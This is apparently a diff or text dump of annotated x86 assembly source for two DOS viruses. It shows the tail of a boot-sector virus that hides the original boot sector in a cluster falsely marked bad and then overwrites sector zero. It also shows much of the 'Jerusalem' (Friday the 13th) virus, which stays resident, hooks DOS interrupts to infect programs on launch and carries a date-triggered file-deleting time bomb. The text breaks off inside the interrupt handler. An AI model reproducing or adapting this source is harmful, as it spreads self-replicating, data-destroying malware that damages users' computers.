+JNZ   HEAD_EM_OUT         ; EXIT IF DIFFERENT SIZE<br>
+CMP   ALCSEC,2       ; SECTORS PER CLUSTER<br>
+JB    HEAD_EM_OUT         ; EXIT IF LESS THAN 2<br>
+MOV   CX,VERVED      ; GET RESERVED SECTORS<br>
+MOV   AL,RUMNUM      ; NUMBER OF FATS<br>
+CBW                  ; FILL OUT REGISTER<br>
+MUL   FASNUM         ; SECTORS PER FAT<br>
+ADD   CX,AX          ; SECTOR OF ROOT DIR<br>
+MOV   AX,20H         ; LENGTH OF DIR ENTRY<br>
+MUL   ROTRID         ; NUMBER OF DIR ENTRIES<br>
+ADD   AX,1FFH        ; ROUND UP TO WHOLE SECTORS<br>
+MOV   BX,200H        ; LENGTH OF SECTOR<br>
+DIV   BX             ; SECTORS OF ROOT DIR<br>
+ADD   CX,AX          ; SECTOR OF FIRST CLUSTER<br>
+MOV   CURCLS,CX      ; SAVE THIS<br>
+MOV   AX,SECNUM      ; GET NUMBER OF SECTORS<br>
+SUB   AX,CURCLS      ; SUBTRACT NON-DATA SECTORS<br>
+MOV   BL,NUMSEC      ; GET SECTORS PER CLUSTER<br>
+XOR   DX,DX<br>
+XOR   BH,BH          ; CLEAR TOP OF REGISTER<br>
+DIV   BX             ; CALCULATE NUMBER OF CLUSTERS<br>
+INC   AX             ; ALLOW FOR NUMBER ONE NOT USED<br>
+MOV   DI,AX<br>
+AND   SWITCH,0FBH    ; SET OFF 16-BIT FAT SWITCH<br>
+CMP   AX,0FF0H       ; SEE IF 12-BIT FAT<br>
+JBE   WRITE_FAT         ; BRANCH IF YES<br>
+OR    SWITCH,4       ; SET ON 16-BIT FAT SWITCH<br>
+WRITE_FAT: <br>
+MOV   SI,1           ; INITIALISE FAT ENTRY COUNT<br>
+MOV   BX,SECRES      ; GET RESERVED SECTORS<br>
+DEC   BX             ; ALLOW FOR ADDITION<br>
+MOV   CURFAT,BX      ; SAVE CURRENT FAT SECTOR<br>
+MOV   PRCFAT,0FEH    ; SET PROCESSED FAT LENGTH TO -2<br>
+JMP   SHORT READ_FAT<br>
+<br>
+; DATA AREA<br>
+<br>
+DW 2     ; CURFAT - CURRENT FAT SECTOR<br>
+DW 12    ; CURCLS - SECTOR NUMBER OF FIRST CLUSTER<br>
+DB 1     ; SWITCH - SWITCHES<br>
+;        - 01H - NESTED INTERRUPT<br>
+;        - 02H - TIMER INTERRUPT INSTALLED<br>
+;        - 04H - 16-BIT FAT<br>
+DB 0               ; LSTDRV - DRIVE LAST USED<br>
+DW 02B8H           ; REMAIN - SECTOR NUMBER OF REST OF CODE<br>
+DB 0               ; RESERV - RESERVED SPACE.. FOR FUTURE HACKING<br>
+DW 1357H, 0AA55H   ; FLAG01 - FLAG FIELD.<br>
+<br>
+; END OF FIRST SECTOR, START OF SECOND<br>
+<br>
+; SEARCH FAT FOR UNUSED CLUSTER<br>
+<br>
+READ_FAT: <br>
+INC   CURFAT         ; ADDRESS TO NEXT FAT SECTOR<br>
+MOV   BX,CURFAT      ; GET NEXT SECTOR NUMBER<br>
+ADD   PRCFAT,2       ; ADD TO PROCESSED FAT LENGTH<br>
+CALL  READ_IT_IN         ; READ FAT SECTOR<br>
+JMP   SHORT GET_EM_NEXT<br>
+<br>
+FAT_SWITCH: <br>
+MOV   AX,3        ; LENGTH OF TWO FAT ENTRIES<br>
+TEST  SWITCH,4    ; TEST 16-BIT FAT SWITCH<br>
+JZ FAT_ENTRY         ; BRANCH IF OFF<br>
+INC   AX          ; FOUR BYTES NOT THREE<br>
+FAT_ENTRY: <br>
+MUL   SI          ; MULTIPLY BY FAT ENTRY NUMBER<br>
+SHR   AX,1        ; DIVIDE BY TWO<br>
+SUB   AH,PRCFAT   ; SUBTRACT PROCESSED FAT LENGTH<br>
+MOV   BX,AX       ; COPY DISPLACEMENT<br>
+CMP   BX,1FFH     ; SEE IF IN THIS SECTOR<br>
+JNB   READ_FAT      ; BRANCH IF NOT<br>
+MOV   DX,[BX+8000H]     ; GET ENTRY<br>
+TEST  SWITCH,4    ; TEST 16-BIT FAT SWITCH<br>
+JNZ   F_TEST_1      ; BRANCH IF ON<br>
+MOV   CL,4        ; POSITIONS TO MOVE<br>
+TEST  SI,1        ; TEST FOR ODD-NUMBERED ENTRY<br>
+JZ    FAT_TOP      ; BRANCH IF NOT<br>
+SHR   DX,CL       ; SHIFT EVEN ENTRY INTO POSITION<br>
+FAT_TOP: <br>
+AND   DH,0FH      ; SWITCH OFF TOP BITS<br>
+F_TEST_1: <br>
+TEST  DX,0FFFFH   ; TEST ALL BITS<br>
+JZ    MAKE_BAD      ; BRANCH IF NONE ON<br>
+GET_EM_NEXT: <br>
+INC   SI          ; NEXT FAT ENTRY<br>
+CMP   SI,DI       ; HAS LAST ENTRY BEEN PROCESSED<br>
+JBE   FAT_SWITCH      ; BRANCH IF NOT<br>
+RET<br>
+<br>
+; SPARE CLUSTER FOUND - INSTALL ON DISK<br>
+<br>
+MAKE_BAD: <br>
+MOV   DX,0FFF7H   ; LOAD BAD SECTOR MARKER<br>
+TEST  SWITCH,4    ; TEST 16-BIT FAT SWITCH<br>
+JNZ   FIND_SECTOR      ; BRANCH IF ON<br>
+AND   DH,0FH      ; CONVERT MARKER TO FF7H<br>
+MOV   CL,4        ; BITS TO MOVE<br>
+TEST  SI,1        ; TEST FOR ODD-NUMBERED ENTRY<br>
+JZ    FIND_SECTOR      ; BRANCH IF NOT<br>
+SHL   DX,CL       ; MOVE INTO POSITION<br>
+FIND_SECTOR: <br>
+OR [BX+8000H],DX  ; PUT MARKER INTO FAT<br>
+MOV   BX,CURFAT   ; GET SECTOR NUMBER<br>
+CALL  WRITE_IT_OUT      ; WRITE FAT SECTOR<br>
+MOV   AX,SI       ; GET ENTRY NUMBER<br>
+SUB   AX,2        ; SUBTRACT FIRST CLUSTER NUMBER<br>
+MOV   BL,NUMSEC   ; GET SECTORS PER CLUSTER<br>
+XOR   BH,BH       ; CLEAR TOP OF REGISTER<br>
+MUL   BX          ; CONVERT TO SECTORS<br>
+ADD   AX,CURCLS   ; ADD SECTOR NUMBER OF 1ST CLUSTER<br>
+MOV   SI,AX       ; SAVE REAL SECTOR NUMBER<br>
+MOV   BX,0        ; SECTOR ZERO<br>
+CALL  READ_IT_IN      ; READ BOOT SECTOR<br>
+MOV   BX,SI       ; GET OUTPUT SECTOR NUMBER<br>
+INC   BX          ; ADDRESS TO NEXT SECTOR<br>
+CALL  WRITE_IT_OUT      ; WRITE BOOT SECTOR TO STORE<br>
+PLACE_VIRUS: <br>
+MOV   BX,SI       ; GET OUTPUT SECTOR NUMBER<br>
+MOV   REMAIN,SI   ; SAVE SECTOR NO OF REST OF CODE<br>
+PUSH  CS          ; \ GET CURRENT SEGMENT<br>
+POP   AX          ; /<br>
+SUB   AX,20H      ; ADDRESS BACK TO VIRUS (2)<br>
+MOV   ES,AX       ; SET BUFFER ADDRESS<br>
+CALL  WRITE_IT_OUT      ; WRITE VIRUS (2)<br>
+PUSH  CS          ; \ GET CURRENT SEGMENT<br>
+POP   AX          ; /<br>
+SUB   AX,40H      ; ADDRESS BACK TO VIRUS (1)<br>
+MOV   ES,AX       ; SET BUFFER ADDRESS<br>
+MOV   BX,0        ; SECTOR ZERO<br>
+CALL  WRITE_IT_OUT      ; WRITE VIRUS (1)<br>
+RET<br>
+<br>
+DW 20CH        ; LASTTM - SYSTEM TIME LAST CALLED<br>
+DB 2           ; PRCFAT - PROCESSED FAT / 256<br>
+<br>
+; INSTALL INTERRUPT 8 (SYSTEM CLOCK) ROUTINE IF NOT DONE<br>
+<br>
+INTERRUPT_08: <br>
+TEST  SWITCH,2       ; TEST INT 8 INSTALLED SWITCH<br>
+JNZ   FINISH_TIME         ; BRANCH IF ON<br>
+OR    SWITCH,2       ; SET ON INT 8 INSTALLED SWITCH<br>
+MOV   AX,0           ; \ SEGMENT ZERO<br>
+MOV   DS,AX          ; /<br>
+MOV   AX,INT8OF      ; SAVE INT 8 OFFSET<br>
+MOV   BX,INT8SG      ; SAVE INT 8 SEGMENT<br>
+MOV   INT8OF,OFFSET DO_VIDEO+7C00H ; NEW INT 8 OFFSET<br>
+MOV   INT8SG,CS      ; NEW INT 8 SEGMENT<br>
+PUSH  CS             ; \ SET DS EQUAL TO CS<br>
+POP   DS             ; /<br>
+MOV   ORG08O,AX      ; STORE OLD INT 8 OFFSET<br>
+MOV   ORG08S,BX      ; STORE OLD INT 8 SEGMENT<br>
+FINISH_TIME: <br>
+RET<br>
+<br>
+; INTERRUPT 10<br>
+<br>
+DO_VIDEO: <br>
+PUSH  DS<br>
+PUSH  AX<br>
+PUSH  BX<br>
+PUSH  CX<br>
+PUSH  DX<br>
+PUSH  CS             ; \ SET DS EQUAL TO CS<br>
+POP   DS             ; /<br>
+MOV   AH,0FH         ; GET VDU PARAMETERS<br>
+INT   10H            ; VDU INTERRUPT<br>
+MOV   BL,AL          ; VDU MODE<br>
+CMP   BX,MODEAP      ; TEST MODE AND ACTIVE PAGE<br>
+JZ    CHARACTER_ATTRIB         ; BRANCH IF UNCHANGED<br>
+MOV   MODEAP,BX      ; SAVE MODE AND ACTIVE PAGE<br>
+DEC   AH             ; VISIBLE COLUMNS<br>
+MOV   COLUMN,AH      ; SAVE VISIBLE COLUMNS - 1<br>
+MOV   AH,1           ; GRAPHICS MODE SWITCH ON<br>
+CMP   BL,7           ; TEST FOR TELETYPE MODE<br>
+JNZ   IS_IT_GRAPHICS         ; BRANCH IF NOT<br>
+DEC   AH             ; GRAPHICS MODE SWITCH OFF<br>
+IS_IT_GRAPHICS: <br>
+CMP   BL,4           ; TEST FOR GRAPHICS MODE<br>
+JNB   ROW_AND_COLUMN         ; BRANCH IF GRAPHICS OR TELETYPE<br>
+DEC   AH             ; GRAPHICS MODE SWITCH OFF<br>
+ROW_AND_COLUMN: <br>
+MOV   GRAPHM,AH      ; STORE GRAPHICS MODE SWITCH<br>
+MOV   ROWCOL,101H    ; SET ROW AND COLUMN POSITIONS<br>
+MOV   ROWCLM,101H    ; SET ROW AND COLUMN MOVEMENT<br>
+MOV   AH,3           ; GET CURSOR ADDRESS<br>
+INT   10H            ; VDU INTERRUPT<br>
+PUSH  DX             ; SAVE CURSOR ADDRESS<br>
+MOV   DX,ROWCOL      ; GET ROW AND COLUMN POSITIONS<br>
+JMP   SHORT VIDEO_01<br>
+<br>
+CHARACTER_ATTRIB: <br>
+MOV   AH,3        ; GET CURSOR ADDRESS<br>
+INT   10H         ; VDU INTERRUPT<br>
+PUSH  DX<br>
+MOV   AH,2        ; SET CURSOR ADDRESS<br>
+MOV   DX,ROWCOL   ; GET ROW AND COLUMN POSITIONS<br>
+INT   10H         ; VDU INTERRUPT<br>
+MOV   AX,CHARAT   ; GET CHARACTER AND ATTRIBUTES<br>
+CMP   GRAPHM,1    ; TEST FOR GRAPHICS MODE<br>
+JNZ   WRITE_CHAR      ; BRANCH IF NOT<br>
+MOV   AX,8307H    ; CHARACTER AND WRITE MODE<br>
+WRITE_CHAR: <br>
+MOV   BL,AH       ; MOVE ATTRIBUTE OR WRITE MODE<br>
+MOV   CX,1        ; ONLY ONCE<br>
+MOV   AH,9        ; WRITE CHARACTER AND ATTRIBUTES<br>
+INT   10H         ; VDU INTERRUPT<br>
+VIDEO_01: <br>
+MOV   CX,ROWCLM      ; GET ROW AND COLUMN MOVEMENT<br>
+CMP   DH,0           ; IS ROW ZERO<br>
+JNZ   VIDEO_02         ; BRANCH IF NOT<br>
+XOR   CH,0FFH        ; \ REVERSE ROW MOVEMENT<br>
+INC   CH             ; /<br>
+VIDEO_02: <br>
+CMP   DH,18H         ; IS ROW 24<br>
+JNZ   VIDEO_04         ; BRANCH IF NOT<br>
+XOR   CH,0FFH        ; \ REVERSE ROW MOVEMENT<br>
+INC   CH             ; /<br>
+VIDEO_04: <br>
+CMP   DL,0           ; IS COLUMN 0<br>
+JNZ   VIDEO_05         ; BRANCH IF NOT<br>
+XOR   CL,0FFH        ; \ REVERSE COLUMN MOVEMENT<br>
+INC   CL             ; /<br>
+VIDEO_05: <br>
+CMP   DL,COLUMN      ; IS COLUMN LAST VISIBLE COLUMN<br>
+JNZ   VIDEO_07         ; BRANCH IF NOT<br>
+XOR   CL,0FFH        ; \ REVERSE COLUMN MOVEMENT<br>
+INC   CL             ; /<br>
+VIDEO_07: <br>
+CMP   CX,ROWCLM      ; COMPARE ROW AND COLUMN MOVEMENT<br>
+JNZ   VIDEO_09         ; BRANCH IF CHANGED<br>
+MOV   AX,CHARAT      ; GET CHARACTER AND ATTRIBUTES<br>
+AND   AL,7           ; SWITCH OFF TOP BIT OF CHARACTER<br>
+CMP   AL,3           ; TEST BITS 1 AND 2<br>
+JNZ   VIDEO_08         ; BRANCH IF OFF<br>
+XOR   CH,0FFH        ; \ REVERSE ROW MOVEMENT<br>
+INC   CH             ; /<br>
+VIDEO_08: <br>
+CMP   AL,5           ; TEST BITS 1 AND 3<br>
+JNZ   VIDEO_09         ; BRANCH IF OFF<br>
+XOR   CL,0FFH        ; \ REVERSE COLUMN MOVEMENT<br>
+INC   CL             ; /<br>
+VIDEO_09: <br>
+ADD   DL,CL       ; NEW COLUMN POSITION<br>
+ADD   DH,CH       ; NEW ROW POSITION<br>
+MOV   ROWCLM,CX   ; SAVE ROW AND COLUMN POSITIONS<br>
+MOV   ROWCOL,DX   ; SAVE ROW AND COLUMN POSITIONS<br>
+MOV   AH,2        ; SET CURSOR ADDRESS<br>
+INT   10H         ; VDU INTERRUPT<br>
+MOV   AH,8        ; READ CHARACTER AND ATTRIBUTES<br>
+INT   10H         ; VDU INTERRUPT<br>
+MOV   CHARAT,AX   ; SAVE CHARACTER AND ATTRIBUTES<br>
+MOV   BL,AH       ; MOVE ATTRIBUTES<br>
+CMP   GRAPHM,1    ; TEST FOR GRAPHICS MODE<br>
+JNZ   VIDEO_10      ; BRANCH IF NOT<br>
+MOV   BL,83H      ; WRITE MODE FOR GRAPHICS<br>
+VIDEO_10: <br>
+MOV   CX,1        ; ONCE ONLY<br>
+MOV   AX,907H     ; WRITE CHARACTER AND ATTRIBUTES<br>
+INT   10H         ; VDU INTERRUPT<br>
+POP   DX          ; RESTORE CURSOR ADDRESS<br>
+MOV   AH,2        ; SET CURSOR ADDRESS<br>
+INT   10H         ; VDU INTERRUPT<br>
+POP   DX<br>
+POP   CX<br>
+POP   BX<br>
+POP   AX<br>
+POP   DS<br>
+DB 0EAH        ; FAR JUMP TO ORIGINAL INT 8<br>
+DW 0907H       ; ORG08O - ORIGINAL INT 8 OFFSET<br>
+DW 10BDH       ; ORG08S - ORIGINAL INT 8 SEGMENT<br>
+<br>
+DW 0720H       ; CHARAT - CHARACTER AND ATTRIBUTES<br>
+DW 1533H       ; ROWCOL - ROW AND COLUMN POSITIONS<br>
+DW 01FFH       ; ROWCLM - ROW AND COLUMN MOVEMENT<br>
+DB 0           ; GRAPHM - GRAPHICS MODE SWITCH<br>
+DW 3           ; MODEAP - MODE AND ACTIVE PAGE<br>
+DB 4FH         ; DW7FD6 - VISIBLE COLUMNS - 1<br>
+<br>
+DB 0B7H, 0B7H, 0B7H, 0B6H, 040H, 040H, 088H, 0DEH, 0E6H<br>
+DB 05AH, 0ACH, 0D2H, 0E4H, 0EAH, 0E6H, 040H, 050H<br>
+DB 0ECH, 040H, 064H, 05CH, 060H, 052H, 040H, 040H<br>
+DB 040H, 040H, 064H, 062H, 05EH, 062H, 060H, 05EH<br>
+DB 070H, 06EH, 040H, 041H, 0B7H, 0B7H, 0B7H, 0B6H<br>
+<br>
+; END OF SECOND SECTOR, ORIGINAL BOOT SECTOR BEGINS HERE<br>
+<br>
+CODE  ENDS<br>
+<br>
+END   START<br>
+<br>
+<br>
+***************************************************************************<br>
+---------------------------------------------------------------------------<br>
+---------------------------------------------------------------------------<br>
+***************************************************************************<br>
+<br>
+The "Jerusalem" virus.<br>
+Also Called - Israeli, PLO, Friday the 13th - Version A<br>
+<br>
+PAGE 64,132<br>
+;-----------------------------------------------------------------------;<br>
+; THE "JERUSALEM" VIRUS                               ;<br>
+;-----------------------------------------------------------------------;<br>
+;<br>
+ORG  100H           ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; JERUSALEM VIRUS                                ;<br>
+;-----------------------------------------------------------------------;<br>
+BEGIN_COM:                   ;COM FILES START HERE<br>
+JMP  CONTINUE       ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+A0103         DB      073H,055H<br>
+<br>
+MS_DOS        DB   'MsDos'        ;<br>
+<br>
+DB   000H,001H,015H,018H<br>
+<br>
+TIME_BOMB     DB   0         ;WHEN == 1 THIS FILE GETS DELETED!<br>
+<br>
+DB   000H<br>
+A0010         DB   000H<br>
+<br>
+A0011         DW   100H      ;HOST SIZE (BEFORE INFECTION)<br>
+<br>
+OLD_08        DW   0FEA5H,0F000H  ;OLD INT 08H VECTOR (CLOCK TIC)<br>
+<br>
+OLD_21        DW   1460H,024EH    ;OLD INT 21H VECTOR<br>
+OLD_24        DW   0556H,16A5H    ;001B<br>
+<br>
+A_FLAG        DW   7E48H          ;???<br>
+<br>
+A0021         DB   000H,000H,000H,000H,000H,000H,000H<br>
+DB   000H,000H,000H,000H<br>
+<br>
+A002C         DW   0         ;A SEGMENT<br>
+<br>
+DB   000H,000H<br>
+A0030         DB   000H<br>
+<br>
+A0031         DW   0178EH         ;OLD ES VALUE<br>
+<br>
+A0033         DW   0080H          ;<br>
+;<br>
+EXEC_BLOCK    DW   0         ;ENV. SEG. ADDRESS  ;0035<br>
+DW   80H       ;COMMAND LINE ADDRESS<br>
+DW   178EH          ;+4<br>
+DW   005CH          ;FCB #1 ADDRESS<br>
+DW   178EH          ;+8<br>
+DW   006CH          ;FCB #2 ADDRESS<br>
+DW   0178EH         ;+12<br>
+;<br>
+HOST_SP       DW   0710H          ;(TAKEN FROM EXE HEADER) 0043<br>
+HOST_SS       DW   347AH          ;(AT TIME OF INFECTION)<br>
+HOST_IP       DW   00C5H          ;<br>
+HOST_CS       DW   347AH          ;<br>
+;CHECKSUM NOT STORED, TO UNINFECT, YOU MUST CALC IT YOURSELF<br>
+;<br>
+A004B         DW   0F010H              ;<br>
+A004D         DB   82H            ;<br>
+A004E         DB   0              ;<br>
+<br>
+EXE_HDR       DB   1CH DUP (?)         ;004F<br>
+<br>
+A006B         DB   5 DUP (?)      ;LAST 5 BYTES OF HOST<br>
+<br>
+HANDLE        DW   0005H               ;0070<br>
+HOST_ATT DW   0020H               ;0072<br>
+HOST_DATE     DW   0021H               ;0074<br>
+HOST_TIME     DW   002DH               ;0076<br>
+<br>
+BLOCK_SIZE    DW   512            ;512 BYTES/BLOCK<br>
+<br>
+A007A         DW   0010H<br>
+<br>
+HOST_SIZE     DW   27C0H,0001H         ;007C<br>
+HOST_NAME     DW   41D9H,9B28H         ;POINTER TO HOST NAME<br>
+<br>
+COMMAND_COM   DB   'COMMAND.COM'<br>
+<br>
+DB   1<br>
+A0090         DB   0,0,0,0,0<br>
+<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+CONTINUE:                    ;<br>
+CLD                 ;<br>
+MOV  AH,0E0H             ;DO A ???...<br>
+INT  21H            ;<br>
+;<br>
+CMP  AH,0E0H             ;<br>
+JNC  L01B5               ;<br>
+CMP  AH,3           ;<br>
+JC   L01B5               ;<br>
+;<br>
+MOV  AH,0DDH             ;<br>
+MOV  DI,offset BEGIN_COM ;DI = BEGINNING OF OUR (VIRUS) CODE<br>
+MOV  SI,0710H       ;SI = SIZE OF OUR (VIRUS) CODE<br>
+ADD  SI,DI               ;SI = BEGINNING OF HOST CODE<br>
+MOV  CX,CS:[DI+11H]      ;CX = (SIZE OF HOST CODE?)<br>
+INT  21H            ;<br>
+;<br>
+L01B5:   MOV  AX,CS               ;TWEEK CODE SEGMENT BY 100H<br>
+ADD  AX,10H              ;<br>
+MOV  SS,AX               ;SS = TWEEKed CS<br>
+MOV  SP,700H             ;SP = END OF OUR CODE (VIRUS)<br>
+;<br>
+;TWEEK CS TO MAKE IT LOOK LIKE IP STARTS AT 0, NOT 100H BY DOING A RETF<br>
+;<br>
+PUSH AX             ;JMP FAR CS+10H:IP-100H<br>
+MOV  AX,offset BEGIN_EXE - offset BEGIN_COM<br>
+PUSH AX             ;<br>
+RETF                ;<br>
+;<br>
+;---------------------------------------;<br>
+ORG  0C5h           ;<br>
+;---------------------------------------;<br>
+;<br>
+BEGIN_EXE:                   ;EXE FILES START HERE<br>
+CLD                 ;<br>
+PUSH ES             ;<br>
+;<br>
+MOV  CS:[A0031],ES       ;<br>
+MOV  CS:[EXEC_BLOCK+4],ES     ;INIT EXEC_BLOCK SEG VALUES<br>
+MOV  CS:[EXEC_BLOCK+8],ES     ;<br>
+MOV  CS:[EXEC_BLOCK+12],ES    ;<br>
+;<br>
+MOV  AX,ES               ;TWEEK ES SAME AS CS ABOVE<br>
+ADD  AX,10H              ;<br>
+ADD  CS:[HOST_CS],AX          ;   SAVE NEW ES VALUE<br>
+ADD  CS:[HOST_SS],AX          ;<br>
+;<br>
+MOV  AH,0E0H             ;<br>
+INT  21H            ;<br>
+;<br>
+CMP  AH,0E0H             ;<br>
+JNC  L0106               ;00F1     7313<br>
+;<br>
+CMP  AH,3           ;<br>
+POP  ES             ;00F6<br>
+MOV  SS,CS:[HOST_SS]          ;<br>
+MOV  SP,CS:[HOST_SP]          ;<br>
+JMP  far CS:[HSOT_IP]    ;<br>
+;<br>
+L0106:   XOR  AX,AX               ;0106     33C0<br>
+MOV  ES,AX               ;0108     8EC0<br>
+MOV  AX,ES:[03FC]        ;010A     26A1FC03<br>
+MOV  CS:[A004B],AX       ;010E     2EA34B00<br>
+MOV  AL,ES:[03FE]        ;0112     26A0FE03<br>
+MOV  CS:[A004D],AL       ;0116     2EA24D00<br>
+MOV  Word ptr ES:[03FC],A5F3  ;011A     26C706FC03F3A5<br>
+MOV  Byte ptr ES:[03FE],CB    ;0121     26C606FE03CB<br>
+POP  AX             ;0127     58<br>
+ADD  AX,10H              ;0128     051000<br>
+MOV  ES,AX               ;012B     8EC0<br>
+PUSH CS             ;012D     0E<br>
+POP  DS             ;012E     1F<br>
+MOV  CX,710H             ;SIZE OF VIRUS CODE<br>
+SHR  CX,1           ;0132     D1E9<br>
+XOR  SI,SI               ;0134     33F6<br>
+MOV  DI,SI               ;0136     8BFE<br>
+PUSH ES             ;0138     06<br>
+MOV  AX,0142             ;0139     B84201<br>
+PUSH AX             ;013C     50<br>
+JMP  0000:03FC      ;013D     EAFC030000<br>
+;<br>
+MOV  AX,CS               ;0142     8CC8<br>
+MOV  SS,AX               ;0144     8ED0<br>
+MOV  SP,700H             ;0146     BC0007<br>
+XOR  AX,AX               ;0149     33C0<br>
+MOV  DS,AX               ;014B     8ED8<br>
+MOV  AX,CS:[A004B]       ;014D     2EA14B00<br>
+MOV  [03FC],AX      ;0151     A3FC03<br>
+MOV  AL,CS:[A004D]       ;0154     2EA04D00<br>
+MOV  [03FE],AL      ;0158     A2FE03<br>
+MOV  BX,SP               ;015B     8BDC<br>
+MOV  CL,04               ;015D     B104<br>
+SHR  BX,CL               ;015F     D3EB<br>
+ADD  BX,+10              ;0161     83C310<br>
+MOV  CS:[A0033],BX       ;<br>
+;<br>
+MOV  AH,4AH              ;<br>
+MOV  ES,CS:[A0031]       ;<br>
+INT  21H            ;MODIFY ALLOCATED MEMORY BLOCKS<br>
+;<br>
+MOV  AX,3521             ;<br>
+INT  21H            ;GET VECTOR<br>
+MOV  CS:[OLD_21],BX      ;<br>
+MOV  CS:[OLD_21+2],ES    ;<br>
+;<br>
+PUSH CS             ;0181     0E<br>
+POP  DS             ;0182     1F<br>
+MOV  DX,offset NEW_INT_21     ;0183     BA5B02<br>
+MOV  AX,2521             ;<br>
+INT  21H            ;SAVE VECTOR<br>
+;<br>
+MOV  ES,[A0031]          ;018B     8E063100<br>
+MOV  ES,ES:[A002C]       ;018F     268E062C00<br>
+XOR  DI,DI               ;0194     33FF<br>
+MOV  CX,7FFFH       ;0196     B9FF7F<br>
+XOR  AL,AL               ;0199     32C0<br>
+REPNE     SCASB               ;019C     AE<br>
+CMP  ES:[DI],AL          ;019D     263805<br>
+LOOPNZ    019B           ;01A0     E0F9<br>
+MOV  DX,DI               ;01A2     8BD7<br>
+ADD  DX,+03              ;01A4     83C203<br>
+MOV  AX,4B00H       ;LOAD AND EXECUTE A PROGRAM<br>
+PUSH ES             ;<br>
+POP  DS             ;<br>
+PUSH CS             ;<br>
+POP  ES             ;<br>
+MOV  BX,35H              ;<br>
+;<br>
+PUSH DS        ;01B1     ;<br>
+PUSH ES             ;<br>
+PUSH AX             ;<br>
+PUSH BX             ;<br>
+PUSH CX             ;<br>
+PUSH DX             ;<br>
+;<br>
+MOV  AH,2AH              ;<br>
+INT  21H            ;GET DATE<br>
+;<br>
+MOV  Byte ptr CS:[TIME_BOMB],0 ;SET "DONT DIE"<br>
+;<br>
+CMP  CX,1987             ;IF 1987...<br>
+JE   L01F7               ;...JUMP<br>
+CMP  AL,5           ;IF NOT FRIDAY...<br>
+JNE  L01D8               ;...JUMP<br>
+CMP  DL,0DH              ;IF DATE IS NOT THE 13th...<br>
+JNE  L01D8               ;...JUMP<br>
+INC  Byte ptr CS:[TIME_BOMB]  ;TIC THE BOMB COUNT<br>
+JMP  L01F7               ;<br>
+;<br>
+L01D8:   MOV  AX,3508H       ;GET CLOCK TIMER VECTOR<br>
+INT  21H            ;GET VECTOR<br>
+MOV  CS:[OLD_08],BX      ;<br>
+MOV  CS:[OLD_08],ES      ;<br>
+;<br>
+PUSH CS             ;DS=CS<br>
+POP  DS             ;<br>
+;<br>
+MOV  Word ptr [A_FLAG],7E90H  ;<br>
+;<br>
+MOV  AX,2508H       ;SET NEW CLOCK TIC HANDLER<br>
+MOV  DX,offset NEW_08    ;<br>
+INT  21H            ;SET VECTOR<br>
+;<br>
+L01F7:   POP  DX             ;<br>
+POP  CX             ;<br>
+POP  BX             ;<br>
+POP  AX             ;<br>
+POP  ES             ;<br>
+POP  DS             ;<br>
+PUSHF                    ;<br>
+CALL far CS:[OLD_21]     ;<br>
+PUSH DS             ;<br>
+POP  ES             ;<br>
+;<br>
+MOV  AH,49H              ;<br>
+INT  21H            ;FREE ALLOCATED MEMORY<br>
+;<br>
+MOV  AH,4DH              ;<br>
+INT  21H            ;GET RETURN CODE OF A SUBPROCESS<br>
+;<br>
+;---------------------------------------;<br>
+; THIS IS WHERE WE REMAIN RESIDENT     ;<br>
+;---------------------------------------;<br>
+MOV  AH,31H              ;<br>
+MOV  DX,0600H  ;020F     ;<br>
+MOV  CL,04               ;<br>
+SHR  DX,CL               ;<br>
+ADD  DX,10H              ;<br>
+INT  21H            ;TERMINATE AND REMAIN RESIDENT<br>
+;<br>
+;---------------------------------------;<br>
+NEW_24:  XOR  AL,AL          ;021B     ;CRITICAL ERROR HANDLER<br>
+IRET                ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; NEW INTERRUPT 08 (CLOCK TIC) HANDLER                     ;<br>
+;-----------------------------------------------------------------------;<br>
+NEW_08:  CMP  Word ptr CS:[A_FLAG],2   ;021E<br>
+JNE  N08_10              ;IF ... JUMP<br>
+;<br>
+PUSH AX             ;<br>
+PUSH BX             ;<br>
+PUSH CX             ;<br>
+PUSH DX             ;<br>
+PUSH BP             ;<br>
+MOV  AX,0602H       ;SCROLL UP TWO LINES<br>
+MOV  BH,87H              ;INVERSE VIDEO ATTRIBUTE<br>
+MOV  CX,0505H       ;UPPER LEFT CORNER<br>
+MOV  DX,1010H       ;LOWER RIGHT CORNER<br>
+INT  10H            ;<br>
+POP  BP             ;<br>
+POP  DX             ;<br>
+POP  CX             ;<br>
+POP  BX             ;<br>
+POP  AX             ;<br>
+;<br>
+N08_10:  DEC  Word ptr CS:[A_FLAG]     ;<br>
+JMP  N08_90              ;  <br>
+MOV  Word ptr CS:[A_FLAG],1   ;<br>
+;<br>
+PUSH AX             ;<br>
+PUSH CX             ;<br>
+PUSH SI             ;  THIS DELAY CODE NEVER GETS EXECUTED  <br>
+MOV  CX,4001H       ;  IN THIS VERSION<br>
+REP  LODSB          ; <br>
+POP  SI             ;<br>
+POP  CX             ;<br>
+POP  AX             ;<br>
+;<br>
+N08_90:  JMP  far CS:[OLD_08]          ;PASS CONTROL TO OLD INT 08 VECTOR<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; NEW INTERRUPT 21 HANDLER                            ;<br>
+;-----------------------------------------------------------------------;<br>
+NEW_21:  PUSHF               ;025B     ;<br>
+CMP  AH,0E0H             ;IF A E0 REQUEST...<br>
+JNE  N21_10              ;<br>
+MOV  AX,300H             ;...RETURN AX = 300H<br>
+POPF                ;   (OUR PUSHF)<br>
+IRET                ;<br>
+;<br>
+N21_10:  CMP  AH,0DDH        ;0266     ;<br>
+JE   N21_30              ;IF DDH...JUMP TO _30<br>
+CMP  AH,0DEH             ;<br>
+JE   N21_40              ;IF DEH...JUMP TO _40<br>
+CMP  AX,4B00H       ;IF SPAWN A PROG...<br>
+JNE  N21_20              ;<br>
+JMP  N21_50              ;...JUMP TO _50<br>
+;<br>
+N21_20:  POPF                ;   (OUR PUSHF)<br>
+JMP  far CS:[OLD_21]          ;ANY OTHER INT 21 GOES TO OLD VECTOR<br>
+;<br>
+N21_30:  POP  AX             ;REMOVE OUR (PUSHF)<br>
+POP  AX             ;?<br>
+MOV  AX,100H             ;<br>
+MOV  CS:[000A],AX        ;<br>
+POP  AX             ;<br>
+MOV  CS:[000C],AX        ;<br>
+REP  MOVSB               ;<br>
+POPF                ;   (OUR PUSHF)<br>
